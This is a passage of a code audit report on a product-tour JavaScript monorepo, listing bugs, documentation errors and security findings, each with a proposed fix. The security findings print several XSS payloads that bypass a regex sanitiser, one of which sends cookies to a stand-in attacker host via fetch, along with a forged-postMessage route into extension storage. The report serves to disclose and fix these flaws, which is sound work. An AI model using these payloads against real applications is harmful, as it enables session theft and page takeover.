**Impact.** Core emits `this.emit('step:enter', { stepId, stepIndex, target })` (packages/core/src/engine/tour.ts:258-262) where `target` is a live `Element` (`_resolveTarget` returns `document.querySelector(step.target)`). `window.postMessage` uses the structured clone algorithm, which cannot clone DOM nodes, so this listener throws `DataCloneError` synchronously. `EventEmitter.emit` (packages/core/src/utils/emitter.ts:33) does `set.forEach((fn) => fn(payload))` with no try/catch, so the throw propagates into TourEngine's `_renderCurrentStep` try block, whose catch runs `this.emit('tour:error', …)` then `this._doEnd(false)` (tour.ts:266-272) — before `this._renderer.renderStep(...)` on line 265 ever executes. Net effect: with the extension installed, any tour step that has a `target` kills the tour instead of rendering, on every page. This is the single most damaging defect in the package and it is reproducible against the repo's own apps/demo, which sets `window.__guideflow`.

**Fix.** In bridge.ts, serialize the payload before posting: deep-clone `args` through a sanitizer that replaces any `Node`/`Element`/`Function` with a descriptor string (e.g. `{ __el: el.tagName + '#' + el.id }`), and wrap the `postMessage` call in try/catch so a clone failure can never escape into the host page's emitter. Add the same guard to the `GF_FLOWS_LIST` and `GF_ACTIVE_TOUR_STATE` posts.

### `cli-docs-flags-all-wrong` — CLI reference documents flags for `export` and `push` that do not exist; every documented invocation fails

**Docs & tests · docs · CONFIRMED** · [`apps/docs/api/cli.md:86`](../../apps/docs/api/cli.md#L86)

> ```
> guideflow export --flow onboarding --out ./dist/flows/onboarding.json
> ```

**Impact.** packages/cli/src/commands/export.ts:204-206 defines a positional `[file]` argument plus `-o, --output <file>` and `--pretty`. There is no `--flow`, no `--out`, no `--config`. Commander exits with "error: unknown option '--flow'". The `push` docs (cli.md:101-108) are worse: they document `--flow`, `--api`, `--token` and `GUIDEFLOW_TOKEN`, while push.ts:130-133 defines a positional `[file]`, a **required** `-k, --api-key`, `-e, --endpoint`, `--env`, and reads `GUIDEFLOW_API_KEY`. The documented `guideflow push --flow onboarding --api https://tours.myapp.com` fails on the unknown option and would fail again on the undocumented required `--api-key`. Both documented commands are 100% non-functional.

**Fix.** Regenerate apps/docs/api/cli.md from `commander`'s own help output (`guideflow export --help`, `guideflow push --help`). Correct table for export: `[file]` positional, `-o, --output`, `--pretty`. For push: `[file]` positional, `-k, --api-key` (required), `-e, --endpoint` (default `https://api.guideflow.dev/v1/flows`), `--env`, env var `GUIDEFLOW_API_KEY`.

### `docs-flat-steps-flow-throws` — Quick Start and AI guides document `gf.start({ id, steps })`, which throws — FlowDefinition requires initial+states

**Docs & tests · docs · CONFIRMED** · [`apps/docs/guide/quick-start.md:16`](../../apps/docs/guide/quick-start.md#L16)

> ```
> gf.start({
>   id: 'welcome',
>   steps: [
>     {
>       id: 'step-1',
>       title: '👋 Welcome!',
> ```

**Impact.** `FlowDefinition` in packages/core/src/types/index.ts:104 is `{ id: string; initial: string; states: Record<string, StateNode> }` — there is no top-level `steps`, and `Step` requires `content: StepContent`, not top-level `title`/`body`. `FlowMachine`'s constructor (packages/core/src/fsm/machine.ts:16) does `if (!(flow.initial in flow.states))` — with both undefined this evaluates `'undefined' in undefined` and throws a TypeError, or with `states: undefined` throws `Cannot use 'in' operator`. The very first code sample a new user copies from the Quick Start page crashes, and it fails `tsc` too. The same broken shape appears at quick-start.md:61 and :79, ai.md:40, :55, :70, api/ai/create-ai.md:50, api/ai/guide-brain.md:35, migrate-driver.md:15, :16, :59, migrate-intro.md:13, :51, docs/usage.html:105, and apps/e2e/fixtures/index.html:26.

**Fix.** Rewrite every flat-`steps` sample to the FSM shape used correctly in apps/docs/guide/vanilla.md:24-46 and packages/core/README.md:25-47. Alternatively, if the flat shape is the intended ergonomic API, implement it: normalise `{id, steps}` into `{id, initial:'main', states:{main:{steps, final:true}}}` inside `createGuideFlow().start()` and widen the `FlowDefinition` type accordingly.

### `react-guide-fabricated-props` — React guide documents props and hook options that none of the components accept

**Docs & tests · docs · CONFIRMED** · [`apps/docs/guide/react.md:113`](../../apps/docs/guide/react.md#L113)

> ```
> <GuidePopover
>   stepId="save-btn"
>   title="Save your work"
>   body="Click Save to persist your changes."
>   placement="bottom"
> />
> ```

**Impact.** `GuidePopoverProps` (packages/react/src/components/GuidePopover.tsx:13-22) is `{ width?: number; children?: ReactNode | fn; className?: string }` — all four documented props are rejected by TypeScript and silently ignored at runtime, so the popover renders the active tour step instead of the documented custom content. The same page is wrong four more times: line 96/101 `<TourStep stepId="welcome">` (the prop is `id`, and it is required — TourStep.tsx:14), line 82 `useHotspot(ref, { tooltip: ... })` (`HotspotOptions` has title/body/placement/color/size, no `tooltip` — types/index.ts:147), line 128 `<HotspotBeacon target tooltip>` (same, HotspotBeacon.tsx:10 extends HotspotOptions), and line 141 `<ConversationalPanel position="bottom-right">` (props are open/onClose/placeholder/title/className — ConversationalPanel.tsx:16-22). A React user following this page gets five compile errors in one file.

**Fix.** Rewrite apps/docs/guide/react.md against the actual exported prop interfaces. Use `<TourStep id="welcome">`, `useHotspot(ref, { title, body })`, `<HotspotBeacon target="#help-btn" title="..." body="..." />`, `<GuidePopover width={360} className="..." />`, and `<ConversationalPanel open onClose={...} placeholder="..." />`. Add a docs test that type-checks fenced tsx blocks, or move the samples into the storybook app where tsc runs on them.

### `theme-css-imports-do-not-exist` — All six theme documentation pages tell users to import CSS files that do not exist

**Docs & tests · docs · CONFIRMED** · [`apps/docs/themes/bold.md:21`](../../apps/docs/themes/bold.md#L21)

> ```
> import '@guideflow/core/styles/themes/bold.css'
> ```

**Impact.** `packages/core/src/styles/` contains exactly seven files — tokens.css, popover.css, themes.css, dark.css, rtl.css, high-contrast.css, index.css. There is no `themes/` directory and no per-theme file. The build step is `tsup && cp -r src/styles dist/styles`, so `dist/styles/themes/bold.css` never exists either; the `"./styles/*"` export maps it to a missing path and the bundler errors with "Failed to resolve import". Themes are actually applied by setting the `data-gf-theme` attribute (see packages/core/src/styles/themes.css:2 `[data-gf-theme="minimal"]`), which no documentation page mentions anywhere. Every one of the five theme pages plus themes/index.md:26 is unusable.

**Fix.** Replace the import instruction on themes/index.md, minimal.md, bold.md, glass.md, brutalist.md and enterprise.md with the real mechanism — `import '@guideflow/core/styles'` plus `document.documentElement.setAttribute('data-gf-theme', 'bold')` — or split themes.css into `src/styles/themes/{minimal,bold,glass,brutalist,enterprise}.css` so the documented imports resolve.

### `no-spa-route-change-handling` — Nothing in the entire monorepo handles SPA route changes — multi-page tours are structurally impossible

**Product gaps · missing-implementation · UNVERIFIED** · [`packages/core/src/engine/tour.ts:287`](../../packages/core/src/engine/tour.ts#L287) · effort L

> ```
>       return document.querySelector(step.target)
> ```

**Impact.** A grep for popstate, pushState, hashchange, the Navigation API, or any router integration across packages/ and apps/ returns zero hits outside a MutationObserver in intro-compat.ts. TourEngine resolves each step's target exactly once via document.querySelector, then waits a fixed 150 ms and renders. A step whose target lives on /settings while the tour started on /dashboard resolves to null and (per silent-missing-target) becomes a full-screen dark modal. Every competitor — Userpilot, Appcues, Pendo, Chameleon, and even react-joyride via its own step lifecycle — supports tours that span route changes; GuideFlow cannot express one. There is also no waitForElement/retry, so a target rendered asynchronously after the 150 ms settle is treated as missing.

**Fix.** Add a navigation-aware target resolver in packages/core/src/engine/tour.ts: poll/MutationObserver with a configurable `waitForTarget` timeout instead of a single querySelector, and add a `navigation` config to GuideFlowConfig that subscribes to popstate + a patched history.pushState/replaceState (or the Navigation API where available) so a step can declare `url`/`urlPattern` and the engine pauses until the route matches. Document the router integration story in apps/docs/guide/.

### `sanitize-html-regex-denylist-bypass` — _sanitizeHTML regex denylist is trivially bypassable — stored XSS via step content.html

**Security · security · CONFIRMED** · [`packages/core/src/renderer/default-renderer.ts:243`](../../packages/core/src/renderer/default-renderer.ts#L243) · effort M

> ```
>   private _sanitizeHTML(html: string): string {
>     return html
>       // Remove dangerous tags entirely (including content)
>       .replace(/<\s*script[^>]*>[\s\S]*?<\s*\/\s*script\s*>/gi, '')
>       .replace(/<\s*style[^>]*>[\s\S]*?<\s*\/\s*style\s*>/gi, '')
>       .replace(/<\s*iframe[^>]*>[\s\S]*?<\s*\/\s*iframe\s*>/gi, '')
>       .replace(/<\s*object[^>]*>[\s\S]*?<\s*\/\s*object\s*>/gi, '')
>       .replace(/<\s*embed[^>]*\/?>/gi, '')
>       .replace(/<\s*form[^>]*>[\s\S]*?<\s*\/\s*form\s*>/gi, '')
>       .replace(/<\s*base[^>]*\/?>/gi, '')
> ```

**Impact.** Every payload below survives `_sanitizeHTML` and lands in `el.innerHTML` at line 93, executing in the host application's origin. (a) Solidus-separated handler: `<img src=x /onerror=alert(document.cookie)>` — the handler regex requires `\s+` immediately before `on\w+`, but here the preceding character is `/`, so no match; the HTML tokenizer hits the unexpected-solidus-in-tag parse error, reconsumes in before-attribute-name state, and `onerror` becomes a live attribute that fires on the failed image load. (b) Unquoted URL scheme: `<a href=javascript:alert(document.domain)>Continue</a>` — the scheme filter only matches when the value is wrapped in a double or single quote, so an unquoted value is untouched. (c) Entity-encoded scheme: `<a href="&#106;avascript:alert(1)">Continue</a>` — the regex looks for the literal string `javascript`; the browser decodes the numeric character reference during attribute-value parsing and navigates to a javascript: URL. (d) Unclosed container tags: the script/style/iframe/object/form removals all require a matching close tag, so `<iframe srcdoc="&lt;script&gt;alert(document.cookie)&lt;/script&gt;">` with no `</iframe>` is passed through verbatim — `srcdoc` is not in the (href|src|action) list, the inner script tag is entity-encoded so the script regex cannot see it, and the browser auto-closes the iframe and executes the script in a same-origin about:srcdoc document. Likewise a bare `<style>@import url(//attacker/x)` survives for CSS-based exfiltration. Attack path: tour flow JSON is fetched from a server, authored in the DevTools extension and pushed via `guideflow push`, or produced by a hostile AI provider response — any of these can set `content.html`. The existing tests (packages/core/src/__tests__/renderer.test.ts:54-104) only assert against the three naive payloads `<script>alert("xss")</script>`, `<img onerror=alert(1)>` and `href="javascript:alert(1)"`, so the denylist passes CI while remaining broken. The type declaration at packages/core/src/types/index.ts:36 actively promises safety: `/** Raw HTML — sanitised by renderer. Only used in themed mode. */`.

**Fix.** Delete `_sanitizeHTML` and stop concatenating untrusted HTML into `innerHTML`. Either (a) require the host app to pass pre-sanitized HTML and rename the field to `unsafeHTML` with a documented "you must sanitize this" contract, or (b) sanitize with the browser's own parser via an allowlist walk: parse with `new DOMParser().parseFromString(html,'text/html')`, then recursively rebuild into a `DocumentFragment` keeping only allowlisted tags (p, span, strong, em, ul, ol, li, br, code, a, img) and allowlisted attributes, resolving every `href`/`src` through `new URL()` and rejecting any scheme not in {http, https, mailto}. Prefer Trusted Types + DOMPurify as a peer dependency if a dependency is acceptable. Update packages/core/src/types/index.ts:36 to stop claiming sanitisation until the guarantee is real, and replace the three-payload test with the bypass corpus above.

### `unescaped-action-variant-attribute-injection` — step.actions[].action and .variant are interpolated into innerHTML attributes with zero escaping

**Security · security · CONFIRMED** · [`packages/core/src/renderer/default-renderer.ts:187`](../../packages/core/src/renderer/default-renderer.ts#L187) · effort S

> ```
>           ${actions.map((a) => `
>             <button class="gf-btn gf-btn-${a.variant ?? 'primary'}" data-gf-action="${a.action}" type="button">
>               ${this._esc(a.label)}
>             </button>
>           `).join('')}
> ```

**Impact.** `a.label` is escaped via `this._esc()` but `a.action` and `a.variant` are not, and the whole `_buildHTML` return value goes to `el.innerHTML` (line 93) without passing through `_sanitizeHTML` — that function is only applied to `content.html` at line 180. The type does not constrain the value either: packages/core/src/types/index.ts:50 declares `action: 'next' | 'prev' | 'skip' | 'end' | (string & object)`, so any string is accepted at compile time, and nothing validates it at runtime. A flow whose step contains an action value of `next" autofocus onfocus="fetch('//attacker/?c='+document.cookie)` renders as `<button class="gf-btn gf-btn-primary" data-gf-action="next" autofocus onfocus="fetch(...)" type="button">`. The XSS fires with no user interaction because `renderStep` deliberately focuses the first focusable element immediately afterwards (lines 122-125: `const firstFocusable = el.querySelector<HTMLElement>('button, [href], ...'); firstFocusable?.focus()`), so `onfocus` triggers on render. `a.variant` is the same sink. Reachable from any server-fetched flow JSON, from `guideflow push`/`export` round-tripped JSON, and from the DevTools extension's flow import (packages/devtools/src/panel/app.tsx:470-489 `JSON.parse` with no schema validation).

**Fix.** Wrap both interpolations: `data-gf-action="${this._esc(String(a.action))}"` and `gf-btn-${this._esc(String(a.variant ?? 'primary'))}`. Additionally validate `variant` against the literal set `['primary','secondary','ghost']` and fall back to `'primary'` on mismatch, and build the buttons with `document.createElement` + `setAttribute` instead of string concatenation so attribute boundaries cannot be escaped at all.
---

## 5. P1 — serious defects and non-functional headline features

119 findings.

#### Core engine (15)

- **`attribute-tour-one-step-per-state`** — Attribute (Intro.js compat) tours render every step as a standalone 1-step tour with a "Done" button that ends the tour  
  [`packages/core/src/compat/intro-compat.ts:91`](../../packages/core/src/compat/intro-compat.ts#L91) · *bug* · CONFIRMED
  <br>**Impact:** Each scanned element becomes its own state holding exactly one step, so `machine.totalSteps === 1` for every step. DefaultRenderer then computes `isLast = index === total - 1` → `0 === 0` → true (default-renderer.ts:160), rendering the primary button as `i18n.t('done')` with `action: 'end'`, suppressing the Back button (`isFirst` also true), and omitting both the progress bar and the "Step X of Y" counter (`total > 1…
  <br>**Fix:** Emit a single state containing all steps (`{ initial: 'tour', states: { tour: { steps, on: {} } } }`) so intra-state `nextStep()` drives navigation and totals/progress are correct; keep the multi-state form only if per-step transitions are needed. Alternatively make the renderer take flow-wide totals rather than per-state ones.
- **`broadcastsync-only-on-resume`** — Cross-tab sync is wired only on the resume path, leaks an instance per start(), and applies snapshots from other flows  
  [`packages/core/src/index.ts:254`](../../packages/core/src/index.ts#L254) · *bug* · CONFIRMED
  <br>**Impact:** Three problems in four lines. (1) The constructor runs only inside `if (snapshot && !snapshot.completed)`, so a fresh start (no snapshot) or a start without `context.userId` never creates a channel — `_saveProgress`'s `_broadcastSync?.broadcast(...)` (index.ts:338) is a no-op and nothing is ever published. apps/docs/guide/persistence.md:76 claims "GuideFlow uses BroadcastChannel to sync tour state across browser tabs…
  <br>**Fix:** Create the BroadcastSync once per instance (or lazily on first `start()`), guarded by `userId`; call `_broadcastSync?.destroy()` before reassigning; and filter in the handler: `if (snap.flowId !== engine.flowId) return`. Then re-render after restore (see resume-renders-step-zero).
- **`configure-mostly-ignored`** — `configure()` claims it can be called at any time but only `nonce` takes effect  
  [`packages/core/src/index.ts:216`](../../packages/core/src/index.ts#L216) · *bug* · CONFIRMED
  <br>**Impact:** `renderer`, `persistence`, `spotlight`, `context`, `debug` and `injectStyles` are all consumed once, at factory time: the renderer instance (index.ts:161), `new ProgressStore(_config.persistence)` (163), and the TourEngine options object with `spotlight`/`context`/`debug` (170-175). `configure({ spotlight: { padding: 24 } })` never reaches `TourEngine._options`; `configure({ context: {...} })` never reaches the runni…
  <br>**Fix:** Have `configure()` push the patch down: `engine.setOptions({spotlight, context, debug})` (add the method, and forward context to `machine.updateContext` when a tour is active), recreate/replace the ProgressStore when `persistence` changes, re-run `renderer.onInit(_config)`, and throw or warn for keys that genuinely cannot change after con…
- **`custom-renderer-oninit-never-called`** — A custom renderer's `onInit(config)` is never called — the contract hook only fires for DefaultRenderer  
  [`packages/core/src/index.ts:178`](../../packages/core/src/index.ts#L178) · *bug* · CONFIRMED
  <br>**Impact:** `renderer.onInit(_config)` sits at index.ts:188, inside the `instanceof DefaultRenderer` branch, so a user-supplied `RendererContract` — whose `onInit?(config: GuideFlowConfig)` is documented in types/index.ts:228-229 as "Called once config is ready" — never receives config, never learns the `nonce`, and never learns `injectStyles: false`. Custom renderers relying on `onInit` for style injection or theming silently r…
  <br>**Fix:** Move `renderer.onInit?.(_config)` outside the `instanceof` check and call it again from `configure()` when config changes. Add an action channel to `RendererContract` (e.g. `setActionHandler?(fn)`) so custom renderers are first-class, and document it.
- **`dismissal-never-written`** — `isDismissed` gates every start() but core never calls `markDismissed` — "don't show again" can never engage  
  [`packages/core/src/index.ts:245`](../../packages/core/src/index.ts#L245) · *missing-implementation* · CONFIRMED
  <br>**Impact:** A repo-wide grep for `markDismissed` finds only its definition (progress-store.ts:63), the store's own unit test, and a manual call in apps/demo/src/App.tsx:274. No core code path writes it: `skip()` (Escape key, the ghost "Skip tour" button, and backdrop click all funnel here) calls `_doEnd(false)` → emits `tour:abandon` and nothing else; `stop()`/`end()` likewise. So the documented "don't show again" semantics only…
  <br>**Fix:** Emit an explicit dismissal decision from the engine (e.g. `skip()` emits `tour:dismiss`) and in `createGuideFlow` subscribe: on skip/abandon, `await progress.markDismissed(userId, flowId)` when the step/flow opts in (add `dismissible`/`persistDismissal` to FlowDefinition to avoid surprising permanent suppression), and save the abandon sna…
- **`fsm-navigation-cannot-cross-states`** — prev() and goTo() cannot cross state boundaries — `history` is write-only and failures are silent  
  [`packages/core/src/fsm/machine.ts:101`](../../packages/core/src/fsm/machine.ts#L101) · *bug* · CONFIRMED
  <br>**Impact:** `_ctx.history` is pushed on every transition (machine.ts:80) and never read, so backward navigation across states is impossible: in any flow with one step per state (everything `scanAttributeTour` generates, and the guard example in apps/docs/api/flow-definition.md) Back is a permanent no-op. `TourEngine.prev()` ignores the `false` return and still calls `_renderCurrentStep()` (tour.ts:126-131) after having emitted `…
  <br>**Fix:** Use `history` to implement `prevState()` (pop, restore `stepIndex` to that state's last step) and call it from `prevStep()` when `stepIndex === 0`; make `goToStepById` search all states and transition when the match is in another state; return the boolean up through `TourEngine.prev/goTo` and skip re-render + `step:exit` when navigation d…
- **`hotspot-hint-events-never-forwarded`** — `hotspot:open` / `hint:click` are documented on the instance but never forwarded from their subsystems  
  [`packages/core/src/index.ts:191`](../../packages/core/src/index.ts#L191) · *bug* · CONFIRMED
  <br>**Impact:** The comment promises forwarding, but the only subscription is `tour:complete`. `HotspotManager` emits `hotspot:open` on click/Enter/Space (hotspot.ts:108-114) and `HintSystem` emits `hint:click` (hint.ts:138-144) on their own emitters, which are never bridged to the instance. So `gf.on('hotspot:open', ...)` and `gf.on('hint:click', ...)` — both advertised in packages/core/README.md:92-93 and apps/docs/api/tour-engine…
  <br>**Fix:** In `createGuideFlow`, bridge them: `hotspots.on('hotspot:open', e => engine.emit('hotspot:open', e))` (same for `hotspot:close` and `hint:click`), and keep the returned unsubscribers to call in `destroy()`. Emit `hotspot:close` from `HotspotManager.remove()`/blur. Add a test asserting an instance-level listener receives a beacon click.
- **`i18n-docs-api-does-not-exist`** — Documented i18n API does not exist (`setLocale`, `getLocale`, arbitrary keys) and `t()` returns undefined for unknown keys  
  [`apps/docs/guide/i18n.md:39`](../../apps/docs/guide/i18n.md#L39) · *docs* · CONFIRMED
  <br>**Impact:** `I18nRegistry` exposes `use(locale)`, an `activeLocale` getter and `getLocale(locale?)` that returns a whole `Locale` object — there is no `setLocale` and no string-returning `getLocale()`, so every code sample on the page throws `TypeError: gf.i18n.setLocale is not a function`. The page also documents free-form keys (`'tour.welcome.title'`, `'btn.next'`), but `t(key: keyof Locale)` accepts only the 8 built-in UI key…
  <br>**Fix:** Rewrite apps/docs/guide/i18n.md against the real API (`register`, `use`, `activeLocale`, `t` with the 8 keys) and state clearly that i18n covers chrome strings only, not step content. If arbitrary keys are the intent, widen `Locale` to `Record<string, string>` with typed known keys, make `t()` return the key (not `undefined`) on miss, and…
- **`instance-i18n-never-reaches-renderer`** — `instance.i18n` is a dead registry — DefaultRenderer reads the module-level `defaultI18n` singleton  
  [`packages/core/src/renderer/default-renderer.ts:157`](../../packages/core/src/renderer/default-renderer.ts#L157) · *bug* · CONFIRMED
  <br>**Impact:** `createGuideFlow` constructs `const i18n = new I18nRegistry()` (index.ts:162) and exposes it as `instance.i18n`, but the renderer imports and uses `defaultI18n` (i18n/index.ts:64), a different object. Every documented localisation flow is therefore inert: `gf.i18n.register('fr', {...})` + `gf.i18n.use('fr')` leaves the popover buttons in English ("Next", "Back", "Skip tour", "Done", "Step 1 of 3"). Worse, two GuideFl…
  <br>**Fix:** Pass the instance registry into the renderer: add `setI18n(registry: I18nRegistry)` to DefaultRenderer (called from `createGuideFlow` next to `setActionHandler`), defaulting to `defaultI18n`, and use `this._i18n` in `_buildHTML`. Add a test that registers a locale on the instance and asserts the rendered button text changes.
- **`pause-does-not-stop-keyboard-or-inflight-render`** — pause() leaves keyboard navigation live and does not cancel an in-flight render, so a paused tour reappears and advances  
  [`packages/core/src/engine/tour.ts:167`](../../packages/core/src/engine/tour.ts#L167) · *bug* · CONFIRMED
  <br>**Impact:** Two gaps. (1) The keydown handler only checks `if (!this._active) return` (tour.ts:325) — while paused, ArrowRight/ArrowDown still call `next()` (which advances the FSM and calls `_renderCurrentStep()`, re-showing the spotlight and popover the pause just hid), ArrowLeft goes back, and Escape silently abandons the tour the caller intended to keep. (2) `pause()` does not bump `_renderGeneration`, so a render already aw…
  <br>**Fix:** Gate the keyboard handler on `if (!this._active || this._paused) return`; bump `this._renderGeneration++` in both `pause()` and `resume()`; and check `this._paused` before the show/render block in `_renderCurrentStep()`.
- **`progress-not-saved-on-start-or-abandon`** — Progress is never persisted for the first step or on abandon — only next/prev/goTo/send save  
  [`packages/core/src/index.ts:262`](../../packages/core/src/index.ts#L262) · *bug* · CONFIRMED
  <br>**Impact:** `_saveProgress()` is called only from the `next`/`prev`/`goTo`/`send` wrappers (index.ts:271, 276, 281, 286). It is not called after `start()`, so a user who abandons on step 0 has nothing stored and restarts from scratch; it is not called from `stop()`/`skip()`/Escape/backdrop-click, so the abandon position is lost even mid-flow (the last stored snapshot is whatever the previous `next()` wrote, and on the final step…
  <br>**Fix:** Call `_saveProgress()` at the end of `start()` (after any restore) and subscribe to `tour:abandon`/`step:exit` to persist on exit paths. Since `_doEnd` clears `_machine`/`_flow` before listeners could read them, capture the snapshot inside `_doEnd` (or emit the state in the `tour:abandon` payload — `stepIndex` is already there, `currentSt…
- **`regex-html-sanitizer-bypass`** — `content.html` "sanitiser" is regex-based and bypassable — unquoted javascript: URLs and unclosed iframes survive  
  [`packages/core/src/renderer/default-renderer.ts:256`](../../packages/core/src/renderer/default-renderer.ts#L256) · *security* · CONFIRMED
  <br>**Impact:** `StepContent.html` is typed with the promise "Raw HTML — sanitised by renderer" (types/index.ts:36) and is injected via `el.innerHTML = this._buildHTML(...)` (default-renderer.ts:93), so authors will feed it CMS/AI/user content. The URL rule only matches quoted attribute values: `<a href=javascript:alert(document.cookie)>Continue</a>` passes through untouched and executes on click. The tag rules require a closing tag…
  <br>**Fix:** Stop hand-rolling: either drop `content.html` support, require callers to pass pre-sanitised nodes, or sanitise structurally — parse with `DOMParser`/`<template>` and walk the tree against an element/attribute allow-list, rejecting any attribute whose trimmed, entity-decoded value scheme is not http/https/mailto. If a dependency is accept…
- **`showif-skip-breaks-back-navigation`** — showIf is evaluated forward-only, so prev() past a hidden step jumps forward again — Back becomes a no-op  
  [`packages/core/src/engine/tour.ts:207`](../../packages/core/src/engine/tour.ts#L207) · *bug* · CONFIRMED
  <br>**Impact:** The skip loop always advances with `nextStep()` regardless of how the step was reached. With steps [s1, s2(showIf:false), s3], pressing Back on s3 runs `prevStep()` → index 1 → the loop sees s2 hidden → `nextStep()` → index 2 → s3 renders again. The user cannot go back past a hidden step; the Back button appears dead and each press emits a spurious `step:skip` for s2 plus a `step:exit`/`step:enter` pair for s3. If s2…
  <br>**Fix:** Pass the traversal direction into `_renderCurrentStep(direction: 'forward' | 'backward' = 'forward')` and use `prevStep()` inside the skip loop when moving backward (ending the loop at index 0 by re-rendering the nearest visible step, or ending the tour only in the forward case).
- **`ttl-zero-expires-immediately`** — `ttl: 0` — documented as "disable expiry" — makes all stored progress expire instantly  
  [`packages/core/src/persistence/progress-store.ts:31`](../../packages/core/src/persistence/progress-store.ts#L31) · *bug* · CONFIRMED
  <br>**Impact:** `0` is not nullish, so `_ttl = 0` and every write stores `expiresAt: Date.now() + 0`. On the next read `Date.now() > entry.expiresAt` is true, so `loadSnapshot`/`isDismissed`/`getCompletedFlows` delete the key and return null/false. apps/docs/guide/persistence.md:101 states "Set `ttl: 0` to disable expiry (progress persists indefinitely)." — following the docs silently disables all persistence, including dismissal an…
  <br>**Fix:** Treat `0` (and `Infinity`) as "never expires": store `expiresAt: this._ttl > 0 ? Date.now() + this._ttl : Number.POSITIVE_INFINITY`, or store no `expiresAt` and skip the expiry branch when it is absent. Add a unit test for `ttl: 0`.
- **`watch-attribute-tour-self-trigger-loop`** — watchAttributeTour re-fires on GuideFlow's own DOM insertions, restarting the tour in a loop  
  [`packages/core/src/compat/intro-compat.ts:137`](../../packages/core/src/compat/intro-compat.ts#L137) · *bug* · CONFIRMED
  <br>**Impact:** The doc comment claims "Debounced to prevent re-triggering from GuideFlow's own DOM mutations" (line 110), but a debounce only delays — it never filters. `attributeFilter` scopes attribute records only; `childList: true, subtree: true` on `document.body` still fires for every node insertion, and GuideFlow appends its own nodes to `document.body`: the popover (default-renderer.ts:152), the overlay and cutout (spotligh…
  <br>**Fix:** Ignore mutations originating from GuideFlow: in the observer callback, drop records whose added/removed nodes are GuideFlow-owned (`[data-gf-overlay]`, `[data-gf-spotlight-cutout]`, `.gf-popover`, `.gf-hotspot`, `.gf-hint-badge`) and bail out when the resulting scan is structurally identical to the last emitted flow (compare step ids). Al…

#### Security (3)

- **`ai-api-key-shipped-to-browser`** — Docs instruct users to inline their OpenAI/Anthropic API key into the client bundle; the documented baseURL proxy escape hatch does not exist  
  [`apps/docs/api/ai/providers.md:30`](../../apps/docs/api/ai/providers.md#L30) · *security* · CONFIRMED
  <br>**Impact:** `import.meta.env.VITE_*` is statically inlined into the client bundle by Vite at build time — the recommended snippet ships a live, billable OpenAI secret key to every visitor, retrievable with View Source. The same pattern is repeated in apps/docs/guide/ai.md:29, apps/docs/api/ai/create-ai.md:43, apps/docs/guide/ai-generate.md:17, and with `VITE_ANTHROPIC_KEY` at apps/docs/api/ai/providers.md:57. Grepping every AI d…
  <br>**Fix:** Three changes. (1) Add `baseURL?: string` to `OpenAIProviderOptions`/`AnthropicProviderOptions` and forward it (`new OpenAI({ apiKey, baseURL: this.opts.baseURL })`) so a BYO-backend proxy is actually possible. (2) In both constructors, throw when `apiKey` is non-empty and `isBrowser()` is true, with a message pointing at the proxy patter…
- **`cli-push-api-key-required-cli-flag`** — guideflow push forces the API key onto the command line; the documented env-var fallback is unreachable and the endpoint is unvalidated  
  [`packages/cli/src/commands/push.ts:24`](../../packages/cli/src/commands/push.ts#L24) · *security* · CONFIRMED
  <br>**Impact:** Two defects compound. (1) The option is declared with `.requiredOption`, so commander aborts with `error: required option '-k, --api-key <key>' not specified` before the action callback ever runs — which means the `process.env['GUIDEFLOW_API_KEY']` fallback at line 35 (`const apiKey: string = opts.apiKey || process.env['GUIDEFLOW_API_KEY'] || '';`) is dead code and the help text's "(or set GUIDEFLOW_API_KEY env var)"…
  <br>**Fix:** Change `.requiredOption('-k, --api-key <key>', ...)` to `.option('-k, --api-key <key>', ...)` so the existing env-var fallback becomes reachable, and make the env var the documented primary path; when `--api-key` is passed on the command line, print a warning that the value is now in shell history. Reject non-HTTPS endpoints unless an exp…
- **`devtools-content-script-relays-any-message-type`** — Content script relays any page postMessage bearing the sentinel into the privileged chrome.runtime bus, giving pages a write primitive into chrome.storage  
  [`packages/devtools/src/content/inspector.ts:64`](../../packages/devtools/src/content/inspector.ts#L64) · *security* · CONFIRMED
  <br>**Impact:** `BRIDGE_SOURCE` is the hardcoded string `'__gf_bridge__'` (line 31) — it is not a secret, it is published in the source and in the web-accessible bridge.js bundle. There is no allowlist on `type`, so any script on any page (the content script matches `<all_urls>`) can forge an arbitrary extension-internal message. Concretely, posting `{source:'__gf_bridge__', type:'GF_SAVE_FLOW', payload:{id:'x'+Math.random(), steps:…
  <br>**Fix:** Add an explicit allowlist in the relay: `const RELAYABLE = new Set(['GF_DETECTED','GF_FLOWS_LIST','GF_TOUR_EVENT','GF_ACTIVE_TOUR_STATE']); if (!type || !RELAYABLE.has(type)) return;` before `chrome.runtime.sendMessage`. Independently, in the background worker, gate every storage-mutating type on provenance — `GF_SAVE_FLOW`/`GF_DELETE_FLO…

#### Build & packaging (4)

- **`core-sideeffects-false-drops-css`** — @guideflow/core declares "sideEffects": false while shipping CSS consumers must import — webpack will tree-shake the stylesheet away  
  [`packages/core/package.json:27`](../../packages/core/package.json#L27) · *bug* · CONFIRMED
  <br>**Impact:** `"sideEffects": false` is a blanket assertion over every file in the package, including `dist/styles/*.css`. webpack 5 (and therefore Next.js, CRA, Rspack) uses it to elide imports whose bindings are unused — and a bare `import '@guideflow/core/styles'` has no bindings. The result is a production build where the tour renders completely unstyled while the dev build looks fine, which is the hardest class of bug for a u…
  <br>**Fix:** Change packages/core/package.json:27 to `"sideEffects": ["**/*.css", "./dist/styles/*"]`. Leave the other five packages at `false` — none of them ship CSS.
- **`e2e-axebuilder-does-not-exist`** — accessibility.spec.ts imports a default `AxeBuilder` from axe-playwright, which has no default export and no AxeBuilder class  
  [`apps/e2e/tests/accessibility.spec.ts:2`](../../apps/e2e/tests/accessibility.spec.ts#L2) · *bug* · CONFIRMED
  <br>**Impact:** I read the installed axe-playwright@2.2.2 type declarations: its only exports are `injectAxe`, `configureAxe`, `getAxeResults`, `getViolations`, `reportViolations`, `checkA11y` and `DefaultTerminalReporter` — there is no `export default` and no symbol named `AxeBuilder` anywhere. The builder API (`new AxeBuilder({ page }).withTags(...).analyze()`) belongs to the different package `@axe-core/playwright`. So `new AxeBu…
  <br>**Fix:** Either swap the dependency to `@axe-core/playwright` in apps/e2e/package.json:12 (and drop it from root package.json:32), or rewrite the two tests against the axe-playwright API: `await injectAxe(page); const violations = await getViolations(page, undefined, { runOnly: { type: 'tag', values: ['wcag2a','wcag2aa'] } });`.
- **`e2e-webserver-points-at-storybook`** — Playwright boots Storybook instead of the demo/fixture page, so every e2e test fails on a missing #start-btn  
